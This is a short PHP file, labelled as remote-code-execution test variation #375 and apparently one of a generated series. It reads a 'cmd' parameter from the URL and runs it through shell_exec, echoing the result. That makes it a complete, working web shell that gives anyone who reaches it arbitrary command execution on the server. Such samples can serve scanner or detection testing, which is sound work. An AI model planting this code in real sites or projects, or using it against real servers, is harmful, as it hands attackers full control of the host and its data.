<?php
// RCE test variation #375
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>